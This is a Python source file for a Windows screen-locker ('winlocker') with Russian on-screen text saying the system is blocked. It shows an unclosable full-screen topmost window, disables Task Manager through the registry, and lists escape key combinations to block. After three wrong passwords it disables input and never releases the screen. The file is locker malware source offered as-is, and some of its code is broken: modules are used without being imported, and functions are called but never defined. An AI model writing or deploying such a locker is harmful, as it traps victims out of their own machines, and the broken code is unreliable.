import pygame
import sys
import time

PASSWORD = "90481"
MAX_ATTEMPTS = 3
LOG_FILE = "winlocker.log"

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {msg}\n")
    except Exception:
        pass

def disable_taskmgr():
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

def enable_taskmgr():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except Exception:
        pass

BLOCKED = [
    "alt+f4","alt+tab","alt+esc","alt+space",
    "ctrl+esc","ctrl+shift+esc","ctrl+alt+delete",
    "win","win+d","win+r","win+l","win+tab","win+e",
    "win+x","win+i","win+s","win+a","win+p","win+u",
    "win+m","win+shift+m","win+space","win+up","win+down",
    "win+left","win+right",
]




def fmt_time(sec):
    sec = max(0, int(sec))
    h = sec // 3600
    m = (sec % 3600) // 60
    s = sec % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def run_locker():
    disable_taskmgr()
    pygame.init()
    info = pygame.display.Info()
    W, H = info.current_w, info.current_h
    screen = pygame.display.set_mode((W, H), pygame.FULLSCREEN | pygame.NOFRAME)
    pygame.display.set_caption("SYSTEM LOCKED")
    clock = pygame.time.Clock()
    font = pygame.font.SysFont("consolas", 28)
    big = pygame.font.SysFont("consolas", 56, bold=True)

    hwnd = pygame.display.get_wm_info()["window"]
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, W, H, 0)

    entered = ""
    message = "Введите пароль для разблокировки"
    locked = True
    reason = "ожидание"
    attempts_left = MAX_ATTEMPTS
    field_focused = True
    input_enabled = True

    box_w, box_h = 420, 48
    box = pygame.Rect(W//2 - box_w//2, H//2 + 80, box_w, box_h)

    while locked:

        for e in pygame.event.get():
            if e.type == pygame.QUIT:
                continue
            if e.type == pygame.MOUSEBUTTONDOWN:
                if input_enabled and box.collidepoint(e.pos):
                    field_focused = True
            if e.type == pygame.KEYDOWN:
                if not (field_focused and input_enabled):
                    continue
                if e.key == pygame.K_ESCAPE:
                    continue
                if e.key == pygame.K_RETURN:
                    if entered == PASSWORD:
                        log(f"UNLOCK: верный пароль, оставалось попыток {attempts_left}")
                        reason = "пароль"
                        locked = False
                    else:
                        attempts_left -= 1
                        log(f"FAIL: неверный пароль, осталось попыток {attempts_left}")
                        entered = ""
                        if attempts_left > 0:
                            word = "попытка" if attempts_left == 1 else "попытки"
                            message = f"Пароль указан неверно, осталось {attempts_left} {word}"
                        else:
                            message = "Попытки исчерпаны."
                            input_enabled = False
                            field_focused = False
                elif e.key == pygame.K_BACKSPACE:
                    entered = entered[:-1]
                else:
                    ch = e.unicode
                    if ch.isprintable() and len(entered) < 32:
                        entered += ch

        screen.fill((10, 10, 14))
        title = big.render("СИСТЕМА ЗАБЛОКИРОВАНА", True, (220, 60, 60))
        screen.blit(title, (W//2 - title.get_width()//2, H//4))

        msg_color = (220, 90, 90) if attempts_left == 0 else (220, 220, 220)
        msg = font.render(message, True, msg_color)
        screen.blit(msg, (W//2 - msg.get_width()//2, H//2 + 40))

        pygame.draw.rect(screen, (30, 30, 36), box, border_radius=6)
        if not input_enabled:
            border_color = (120, 60, 60)
        elif field_focused:
            border_color = (140, 200, 255)
        else:
            border_color = (90, 90, 100)
        pygame.draw.rect(screen, border_color, box, 2, border_radius=6)
        txt = font.render("*" * len(entered), True, (240, 240, 240))
        screen.blit(txt, (box.x + 12, box.y + 10))

        hint_text = "Enter — подтвердить, Backspace — удалить" if input_enabled else "Ввод заблокирован"
        hint = font.render(hint_text, True, (140, 140, 150))
        screen.blit(hint, (W//2 - hint.get_width()//2, H//2 + 145))

        att = font.render(f"Попытки: {attempts_left}/{MAX_ATTEMPTS}", True, (180, 180, 190))
        screen.blit(att, (W//2 - att.get_width()//2, H//2 + 190))

        pygame.display.flip()
        clock.tick(30)

    unblock_keys()
    enable_taskmgr()
    pygame.quit()
    log(f"UNLOCK: {reason}")

def main():
    run_locker()

if __name__ == "__main__":
    main()
